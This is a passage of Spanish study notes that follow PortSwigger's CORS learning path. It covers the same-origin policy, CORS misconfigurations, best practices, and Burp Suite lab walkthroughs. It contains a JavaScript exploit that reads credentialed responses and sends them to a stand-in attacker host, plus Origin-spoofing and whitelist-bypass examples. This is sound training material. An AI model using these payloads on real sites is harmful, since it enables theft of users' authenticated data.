# 🍀 Port Swigger

```
 https://portswigger.net/web-security/learning-paths/cors
```

## ¿Qué es CORS (Cross-Origin Resource Sharing)?

CORS (Cross-Origin Resource Sharing) es un mecanismo del navegador que permite un acceso controlado a recursos alojados en un dominio diferente al de origen de la solicitud. Extiende la **política de mismo origen (SOP)**, permitiendo a los sitios web autorizar solicitudes entre dominios de manera selectiva.

### Características clave de CORS

1. **Acceso controlado**: Permite a los servidores especificar qué orígenes pueden acceder a sus recursos.
2. **Compatibilidad con SOP**: Mientras la política de mismo origen bloquea solicitudes entre dominios por defecto, CORS introduce flexibilidad bajo condiciones específicas.
3. **Seguridad configurable**: Los servidores pueden establecer reglas detalladas como:
   * Permitir ciertos métodos HTTP (por ejemplo, `GET`, `POST`, `DELETE`).
   * Autorizar encabezados personalizados.
   * Definir si las credenciales (como cookies) pueden ser compartidas.

### Riesgos de una configuración incorrecta

Si una política de CORS está mal configurada, puede exponer el sitio a ataques entre dominios, como:

* **Acceso no autorizado**: Un origen malicioso podría acceder a datos sensibles de otro dominio.
* **Filtración de datos**: Un atacante podría exfiltrar información de respuestas accesibles mediante un CORS permisivo.

### Lo que CORS no protege

Aunque facilita el acceso controlado entre dominios, CORS **no es una defensa contra ataques entre dominios** como:

* **CSRF (Cross-Site Request Forgery)**: Donde un atacante engaña a un usuario autenticado para que realice acciones no deseadas.

### Conclusión

CORS es una herramienta poderosa para manejar el acceso entre dominios, pero debe configurarse con cuidado para evitar brechas de seguridad. Implementar una política CORS restrictiva y bien definida es clave para garantizar la seguridad de las aplicaciones web.&#x20;

<figure><img src="../.gitbook/assets/attack-on-cors.svg" alt=""><figcaption></figcaption></figure>

## Política de mismo origen (Same-Origin Policy)

La política de mismo origen (SOP, por sus siglas en inglés) es una especificación restrictiva que limita las interacciones de un sitio web con recursos fuera de su propio dominio. Esta política se definió hace años para prevenir interacciones maliciosas entre dominios, como el robo de datos privados por parte de un sitio web a otro.

### ¿Cómo funciona la política de mismo origen?

* **Restricción de acceso**: Aunque un dominio puede enviar solicitudes a otros dominios, no puede acceder a las respuestas.
* **Definición de "origen"**: Un origen se define por la combinación exacta de:
  * Protocolo (por ejemplo, `https://`)
  * Nombre del host (por ejemplo, `example.com`)
  * Puerto (por ejemplo, `:443` para HTTPS)

Por ejemplo:

* Una página en `https://example.com` **puede interactuar** con recursos en `https://example.com`.
* Pero no puede acceder a respuestas de `http://example.com` o `https://another.com`.

### Propósito de la SOP

La SOP protege contra ataques entre dominios, como:

* **Robo de datos**: Impide que un sitio malicioso acceda a información confidencial en otro dominio.
* **Interacciones no autorizadas**: Bloquea intentos de modificar datos sensibles en sitios externos.

### Limitaciones y extensiones

* **Limitaciones**: Si bien la SOP es una capa importante de seguridad, en aplicaciones modernas puede ser demasiado restrictiva.
* **Extensiones**: Herramientas como **CORS** (Cross-Origin Resource Sharing) permiten superar estas limitaciones de manera controlada, habilitando el acceso entre dominios bajo ciertas condiciones.

### Conclusión

La política de mismo origen es un pilar fundamental de la seguridad web, diseñado para minimizar los riesgos de ataques entre dominios. Sin embargo, su implementación puede necesitar ajustes mediante mecanismos complementarios como CORS para manejar casos de uso legítimos de acceso entre dominios.

## Relajación de la política de mismo origen

La política de mismo origen (SOP) es muy restrictiva, lo que ha llevado al desarrollo de enfoques para mitigar sus limitaciones. Muchos sitios web necesitan interactuar con subdominios o sitios de terceros de manera que requieran acceso completo entre orígenes. Esto se logra mediante una relajación controlada de la política de mismo origen utilizando **Cross-Origin Resource Sharing (CORS)**.

### ¿Qué es CORS?

CORS es un protocolo que permite la comunicación controlada entre recursos de diferentes dominios. Se basa en un conjunto de encabezados HTTP que:

* **Definen orígenes confiables**: Especifican qué dominios pueden acceder al recurso.
* **Establecen propiedades adicionales**: Como si se permite acceso autenticado.

### ¿Cómo funciona la relajación mediante CORS?

1. **Intercambio de encabezados**: El navegador envía una solicitud al servidor con encabezados CORS. Estos incluyen información sobre el dominio de origen que intenta acceder al recurso.
2. **Respuesta del servidor**: El servidor responde con encabezados que indican si el origen es confiable y qué operaciones están permitidas.
3. **Acceso controlado**: Si el servidor confirma que el origen es confiable, el navegador permite el acceso al recurso.

#### Propiedades clave de CORS

* **Orígenes permitidos**: Especificados en el encabezado `Access-Control-Allow-Origin`.
* **Métodos HTTP permitidos**: Indicados en `Access-Control-Allow-Methods`.
* **Acceso autenticado**: Configurado mediante el encabezado `Access-Control-Allow-Credentials`.

### Beneficios y riesgos

#### Beneficios

* Permite que sitios web interactúen con recursos externos de forma controlada.
* Facilita el desarrollo de aplicaciones web modernas que dependen de APIs de terceros o subdominios.

#### Riesgos

* Una configuración CORS mal implementada puede exponer recursos a orígenes no confiables, permitiendo ataques entre dominios.

### Conclusión

CORS ofrece una solución flexible para superar las limitaciones de la política de mismo origen. Al implementar CORS, es fundamental configurar correctamente los encabezados para garantizar que solo los orígenes legítimos puedan acceder a los recursos protegidos.

## Vulnerabilidades derivadas de problemas en la configuración de CORS

Muchos sitios web modernos utilizan **CORS** para permitir el acceso desde subdominios y terceros confiables. Sin embargo, una configuración incorrecta o demasiado permisiva de CORS, implementada para garantizar la funcionalidad, puede dar lugar a **vulnerabilidades explotables**.

### Principales problemas de configuración en CORS

1. **Permitir todos los orígenes (`*`)**
   * Configurar `Access-Control-Allow-Origin: *` permite que cualquier dominio acceda al recurso.
   * Aunque simplifica la implementación, expone los datos a cualquier origen, eliminando el control sobre quién puede acceder.
2. **Reflejar dinámicamente el origen**
   * Algunos servidores reflejan automáticamente el dominio del encabezado `Origin` de la solicitud en `Access-Control-Allow-Origin`, sin verificar si el origen es legítimo.
   * Esto permite que un atacante acceda a los datos desde dominios maliciosos simplemente configurando el encabezado `Origin`.
3. **Permitir credenciales con una configuración insegura**
   * Cuando `Access-Control-Allow-Credentials: true` está habilitado, los navegadores envían cookies, tokens u otras credenciales junto con la solicitud.
   * Si se combina con `Access-Control-Allow-Origin: *` o una lista de orígenes reflejada dinámicamente, un atacante podría robar información sensible autenticada.
4. **Métodos o encabezados permitidos excesivamente amplios**
   * Especificar múltiples métodos HTTP (`Access-Control-Allow-Methods`) o encabezados personalizados (`Access-Control-Allow-Headers`) innecesarios puede ampliar la superficie de ataque.
   * Esto puede permitir que un atacante utilice métodos como `PUT` o `DELETE` para realizar modificaciones no autorizadas.

### Impacto de estas vulnerabilidades

* **Exposición de datos sensibles**: Los atacantes pueden acceder a información privada desde aplicaciones que confían en configuraciones CORS inseguras.
* **Compromiso de cuentas autenticadas**: Si las credenciales del usuario se comparten con orígenes maliciosos, un atacante podría realizar acciones en nombre del usuario.
* **Ataques de escalada**: Los datos accesibles podrían ser utilizados para realizar ataques más avanzados, como inyecciones de código o abuso de APIs.

### Buenas prácticas para configurar CORS

1. **Especificar orígenes confiables explícitamente**
   * Evitar el uso de `*`. En su lugar, incluir únicamente los dominios necesarios en `Access-Control-Allow-Origin`.
2. **No reflejar dinámicamente orígenes sin validación**
   * Implementar listas blancas de dominios confiables y verificar los orígenes antes de incluirlos en las respuestas.
3. **Usar credenciales solo cuando sea necesario**
   * Configurar `Access-Control-Allow-Credentials: true` solo si es imprescindible y en combinación con una lista de orígenes específica.
4. **Restringir métodos y encabezados**
   * Permitir solo los métodos HTTP y encabezados necesarios para la funcionalidad de la aplicación.
5. **Auditar regularmente la configuración de CORS**
   * Revisar la implementación para garantizar que no se introduzcan configuraciones inseguras durante el desarrollo o mantenimiento.

### Conclusión

CORS es una herramienta poderosa para habilitar la interacción entre dominios, pero una configuración descuidada puede comprometer la seguridad del sitio web. Implementar configuraciones restrictivas y revisar periódicamente las políticas de CORS puede mitigar riesgos y proteger los datos de los usuarios.

#### EJEMPLO PRÁCTICO

**Contexto:** Tenemos que abusar de esta función para robar datos a un usuario que en este caso es Administrador.&#x20;



{% embed url="https://youtu.be/2qtI3hNrWRw" %}

<figure><img src="../.gitbook/assets/imagen (163).png" alt=""><figcaption></figcaption></figure>

_Capturamos todo el flow que nos interesa, en este caso de session._

<figure><img src="../.gitbook/assets/imagen (164).png" alt=""><figcaption></figcaption></figure>

_En este caso nos interesa esta solicitud._

<figure><img src="../.gitbook/assets/imagen (165).png" alt=""><figcaption></figcaption></figure>

_Podemos ver con la sesion iniciada que tenemos un valor de cookie._

<figure><img src="../.gitbook/assets/imagen (166).png" alt=""><figcaption></figcaption></figure>

_Eliminamos la cookie y volvemos a iniciar sesion y podemos ver lo siguiente..._

<figure><img src="../.gitbook/assets/imagen (167).png" alt=""><figcaption></figcaption></figure>

_Podemos ver que se almacenan las sesiones._

<figure><img src="../.gitbook/assets/imagen (168).png" alt=""><figcaption></figcaption></figure>

_Aquí lo que podemos ver interesante es lo siguiente: `Access-Control-Allow-Credentials: true`_

<figure><img src="../.gitbook/assets/imagen (169).png" alt=""><figcaption></figcaption></figure>

_Probamos a cambiar la cookie por una de las permitidas._

<figure><img src="../.gitbook/assets/imagen (170).png" alt=""><figcaption></figcaption></figure>

_Hemos probado implementar: `Origin: pwned.com` y podemos ver en la respuesta que lo está aceptando_

## Vulnerabilidad por encabezado ACAO generado por el servidor a partir del encabezado Origin especificado por el cliente

Algunas aplicaciones permiten el acceso a varios dominios. Mantener una lista de dominios permitidos requiere un esfuerzo constante y cualquier error puede afectar la funcionalidad. En lugar de gestionar una lista, algunas aplicaciones optan por permitir el acceso desde cualquier dominio, lo que crea vulnerabilidades explotables.

### Descripción del problema

Una forma común de hacerlo es reflejando el encabezado `Origin` de la solicitud en el encabezado de respuesta `Access-Control-Allow-Origin`. Por ejemplo, cuando la solicitud es:

```
GET /sensitive-victim-data HTTP/1.1 Host: vulnerable-website.com Origin: https://malicious-website.com Cookie: sessionid=...
```

El servidor responde con:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: [https://malicious-website.com](https://malicious-website.com)
Access-Control-Allow-Credentials: true ...
```

Esto indica que el origen `https://malicious-website.com` tiene acceso permitido, y que la solicitud puede incluir credenciales (como cookies).

### Explotación de la vulnerabilidad

Cuando el servidor refleja el encabezado `Origin` de manera insegura en `Access-Control-Allow-Origin`, cualquier dominio puede acceder a los recursos del sitio vulnerable. Si la respuesta contiene datos sensibles como claves API o tokens CSRF, un atacante puede robar esta información al incluir el siguiente script en su propio sitio web malicioso:

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//malicious-website.com/log?key='+this.responseText;
};
```

## Errores al analizar los encabezados Origin

Algunas aplicaciones que admiten acceso desde múltiples orígenes lo hacen mediante una lista blanca de orígenes permitidos. Cuando se recibe una solicitud CORS, el origen proporcionado se compara con la lista blanca. Si el origen está en la lista, se refleja en el encabezado `Access-Control-Allow-Origin`, permitiendo así el acceso.

**Ejemplo**:

Solicitud:

```
HTTP/1.1 200 OK  
Access-Control-Allow-Origin: [https://innocent-website.com](https://innocent-website.com)
```

## Errores al analizar los encabezados `Origin` - Continuación

Los errores suelen surgir al implementar listas blancas de orígenes CORS. Algunas organizaciones deciden permitir el acceso desde todos sus subdominios (incluyendo subdominios futuros que aún no existen). Y algunas aplicaciones permiten el acceso desde los dominios de otras organizaciones, incluyendo sus subdominios. Estas reglas suelen implementarse mediante la coincidencia de prefijos o sufijos de URL, o utilizando expresiones regulares. Cualquier error en la implementación puede llevar a otorgar acceso a dominios externos no deseados.

#### Ejemplos de posibles vulnerabilidades:

1. **Acceso a subdominios mal configurado:**
   * Si la aplicación otorga acceso a todos los dominios que terminan en `normal-website.com`, un atacante podría registrar el dominio:
     * `hackersnormal-website.com`
2. **Coincidencia de prefijos de dominio:**
   * Si la aplicación otorga acceso a todos los dominios que comienzan con `normal-website.com`, un atacante podría explotar esto con un dominio como:
     * `normal-website.com.evil-user.net`

## Valor `null` en la lista blanca de orígenes

La especificación del encabezado `Origin` admite el valor `null`. Los navegadores pueden enviar este valor en el encabezado `Origin` en diversas situaciones inusuales:

* **Redirecciones entre orígenes diferentes**.
* **Solicitudes provenientes de datos serializados**.
* **Solicitudes utilizando el protocolo `file:`**.
* **Solicitudes entre orígenes en un entorno sandbox**.

#### EJEMPLO PRÁCTICO



{% embed url="https://youtu.be/JkBpebHWv2k" %}

<figure><img src="../.gitbook/assets/imagen (171).png" alt=""><figcaption></figcaption></figure>

_Interactuamos todo lo que podamos para poder generar el flow que necesitamos para poder realizar este ataque y poder empezar a buscar vulnerabilidades._

<figure><img src="../.gitbook/assets/imagen (172).png" alt=""><figcaption></figcaption></figure>

_Una vez tengamos registrado todo el movimiento que nos interesa vamos a empezar a ver las solicitudes que nos interesan._

<figure><img src="../.gitbook/assets/imagen (173).png" alt=""><figcaption></figcaption></figure>

_En este caso esta solicitud nos interesa ya que nos proporciona información valiosa._

<figure><img src="../.gitbook/assets/imagen (174).png" alt=""><figcaption></figcaption></figure>

_Ahora vamos a agregar esta información en la solicitud: `Origin: null` y podemos ver la respuesta alterada._

## Explotación de XSS a través de relaciones de confianza en CORS

Incluso una configuración "correcta" de CORS establece una relación de confianza entre dos orígenes. Si un sitio web confía en un origen vulnerable a la inyección de scripts entre sitios (XSS), un atacante podría explotar esta vulnerabilidad de XSS para inyectar JavaScript que use CORS y recuperar información sensible del sitio que confía en la aplicación vulnerable.

### Abatando XSS a través de las relaciones de confianza CORS - Continuado

Dada la siguiente petición:

`GET /api/requestApiKey HTTP/1.1 Host: vulnerable-website.com Origin: https://subdomain.vulnerable-website.com Cookie: sessionid=...`

Si el servidor responde con:

`HTTP/1.1 200 OK Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com Access-Control-Allow-Credentials: true`

Luego un atacante que encuentra una vulnerabilidad XSS en `subdomain.vulnerable-website.com`podría usar eso para recuperar la tecla API, usando una URL como:

`https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`

## Rompiendo TLS con CORS mal configurado

Supongamos que una aplicación que emplea rigurosamente HTTPS también enlista en blanco un subdominio de confianza que está usando HTTP simple. Por ejemplo, cuando la solicitud reciba la siguiente solicitud:

`GET /api/requestApiKey HTTP/1.1 Host: vulnerable-website.com Origin: http://trusted-subdomain.vulnerable-website.com Cookie: sessionid=...`

La aplicación responde con:

`HTTP/1.1 200 OK Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com Access-Control-Allow-Credentials: true`

#### EJEMPLO PRÁCTICO



{% embed url="https://youtu.be/8613OyiUrX8" %}

<figure><img src="../.gitbook/assets/imagen (175).png" alt=""><figcaption></figcaption></figure>

_Entramos en la página víctima y podemos ver varios productos..._

<figure><img src="../.gitbook/assets/imagen (176).png" alt=""><figcaption></figcaption></figure>

_Al entrar a alguno de los producto podemos ver una función que verifica el Stock de estos._

<figure><img src="../.gitbook/assets/imagen (178).png" alt=""><figcaption></figcaption></figure>

_Nos proporciona información sobre el STOCK_

<figure><img src="../.gitbook/assets/imagen (179).png" alt=""><figcaption></figcaption></figure>

_Identificamos la solicitud en el BurpSuite._

<figure><img src="../.gitbook/assets/imagen (180).png" alt=""><figcaption></figcaption></figure>

_La emitimos al repeater y vemos como se comporta._

<figure><img src="../.gitbook/assets/imagen (181).png" alt=""><figcaption></figcaption></figure>

_Vemos que podemos inyectar codigo HTML_

<figure><img src="../.gitbook/assets/imagen (182).png" alt=""><figcaption></figcaption></figure>

_Ahora vamos a probar en algún sitio donde se implemente el uso de CORS y nos interese._

<figure><img src="../.gitbook/assets/imagen (183).png" alt=""><figcaption></figcaption></figure>

_Probamos con el subdominio en el que tenemos una XSS_

## Intranets y CORS sin credenciales

La mayoría de los ataques CORS dependen de la presencia del encabezado de respuesta:

```
Access-Control-Allow-Credentials: true
```

Sin este encabezado, el navegador de la víctima se negará a enviar sus cookies, lo que significa que el atacante solo podrá acceder a contenido no autenticado, al que podría acceder directamente navegando al sitio objetivo.

Sin embargo, hay una situación común donde un atacante no puede acceder directamente a un sitio web: cuando forma parte de la intranet de una organización y está ubicado en un espacio de direcciones IP privadas. Los sitios web internos suelen tener estándares de seguridad más bajos que los sitios externos, lo que permite a los atacantes encontrar vulnerabilidades y obtener acceso adicional.

Por ejemplo, una solicitud de tipo cross-origin dentro de una red privada podría ser la siguiente:

```
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
```

Y el servidor responde con:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```
